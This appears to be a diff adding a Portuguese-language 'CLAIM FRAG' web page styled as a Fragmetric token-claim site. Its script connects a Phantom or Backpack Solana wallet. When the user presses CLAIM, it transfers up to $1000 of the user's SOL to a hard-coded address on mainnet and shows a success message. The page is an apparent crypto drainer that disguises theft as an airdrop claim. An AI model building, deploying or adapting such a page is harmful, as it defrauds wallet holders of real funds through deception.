@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>CLAIM FRAG - Envio de SOL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/@solana/web3.js@1.92.1/lib/index.iife.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+      body {
+        background: linear-gradient(135deg, #181a20 0%, #23263a 100%);
+        color: #fff;
+        font-family: 'Inter', Arial, sans-serif;
+        min-height: 100vh;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+      .container {
+        background: #23263a;
+        border-radius: 18px;
+        box-shadow: 0 4px 24px rgba(44, 62, 80, 0.18);
+        padding: 2.5rem 2rem 2rem 2rem;
+        max-width: 420px;
+        width: 100%;
+        text-align: center;
+      }
+      .logo {
+        width: 80px;
+        margin-bottom: 1.2rem;
+        border-radius: 16px;
+        box-shadow: 0 0 16px #14F19544;
+      }
+      h1 {
+        font-size: 2.2rem;
+        margin-bottom: 0.5rem;
+        color: #9945FF;
+        font-weight: 700;
+      }
+      p {
+        color: #b0b3c6;
+        font-size: 1.1rem;
+        margin-bottom: 2rem;
+      }
+      button {
+        background: linear-gradient(90deg, #9945FF 60%, #14F195 100%);
+        color: #181a20;
+        font-size: 1.1rem;
+        font-weight: 600;
+        border: none;
+        border-radius: 0.7rem;
+        padding: 1rem 2rem;
+        cursor: pointer;
+        margin-bottom: 1.5rem;
+        transition: background 0.2s;
+      }
+      .info, .error {
+        margin-top: 1.2rem;
+        word-break: break-all;
+        font-size: 1rem;
+      }
+      .error {
+        color: #ef476f;
+      }
+      .success {
+        color: #14F195;
+      }
+      .wallet {
+        color: #14F195;
+        font-weight: bold;
+        margin-bottom: 1rem;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img src="logo.png" class="logo" alt="Fragmetric Logo"/>
+      <h1>CLAIM FRAG - Envio de SOL</h1>
+      <p>Conecte sua carteira e envie até $1000 em SOL para a carteira da Fragmetric.</p>
+      <button id="connectBtn">Conectar Carteira Solana</button>
+      <div class="wallet" id="walletInfo"></div>
+      <button id="claimBtn">CLAIM</button>
+      <div class="info" id="statusInfo"></div>
+      <div class="error" id="errorInfo"></div>
+    </div>
+    <script>
+      let provider, pubkey;
+      const connectBtn = document.getElementById('connectBtn');
+      const claimBtn = document.getElementById('claimBtn');
+      const walletInfo = document.getElementById('walletInfo');
+      const statusInfo = document.getElementById('statusInfo');
+      const errorInfo = document.getElementById('errorInfo');
+
+      // Endereço de destino
+      const DESTINATION = "9Ux4eyPcWcatNiCZCvRWzZqJAXZ2WQsj8LXLq3FTVNGD";
+
+      claimBtn.disabled = true;
+
+      connectBtn.onclick = async () => {
+        errorInfo.textContent = '';
+        statusInfo.textContent = '';
+        walletInfo.textContent = '';
+        claimBtn.disabled = true;
+        if (!window.solana || (!window.solana.isPhantom && !window.backpack)) {
+          errorInfo.textContent = "Instale a carteira Phantom ou Backpack para continuar.";
+          return;
+        }
+        try {
+          provider = window.solana?.isPhantom ? window.solana : window.backpack?.solana;
+          await provider.connect();
+          pubkey = provider.publicKey.toString();
+          walletInfo.innerHTML = "Carteira conectada: " + pubkey;
+          claimBtn.disabled = false;
+        } catch (err) {
+          errorInfo.textContent = "Erro: " + (err.message || err);
+        }
+      };
+
+      claimBtn.onclick = async () => {
+        errorInfo.textContent = '';
+        statusInfo.textContent = '';
+        if (!provider || !pubkey) {
+          errorInfo.textContent = "Conecte a carteira primeiro!";
+          return;
+        }
+        try {
+          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta")); // Use "devnet" para testes
+          const fromWallet = new solanaWeb3.PublicKey(pubkey);
+          const destWallet = new solanaWeb3.PublicKey(DESTINATION);
+
+          // 1. Obter saldo em lamports
+          const balanceLamports = await connection.getBalance(fromWallet);
+          const balanceSOL = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
+
+          // 2. Buscar preço do SOL em dólar
+          const priceResp = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
+          const priceData = await priceResp.json();
+          const solPrice = priceData.solana.usd;
+
+          // 3. Calcular saldo em dólares
+          const balanceUSD = balanceSOL * solPrice;
+
+          // 4. Definir valor a transferir
+          let transferUSD = Math.min(balanceUSD, 1000);
+          let transferSOL = transferUSD / solPrice;
+
+          // Deixar uma pequena fração para taxas (~0.001 SOL)
+          if (transferSOL > balanceSOL - 0.001) {
+            transferSOL = balanceSOL - 0.001;
+          }
+          if (transferSOL <= 0) {
+            errorInfo.textContent = "Saldo insuficiente para claim.";
+            return;
+          }
+
+          // 5. Montar e enviar a transação
+          const tx = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: fromWallet,
+              toPubkey: destWallet,
+              lamports: Math.floor(transferSOL * solanaWeb3.LAMPORTS_PER_SOL)
+            })
+          );
+          const { signature } = await provider.signAndSendTransaction(tx);
+          statusInfo.innerHTML = `<span class='success'>CLAIM realizado! Transação: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature}</a><br>Valor: ${transferSOL.toFixed(4)} SOL (~$${transferUSD.toFixed(2)})</span>`;
+          claimBtn.disabled = true;
+        } catch (err) {
+          errorInfo.textContent = "Erro: " + (err.message || err);
+        }
+      };
+    </script>
+  </body>
+</html>
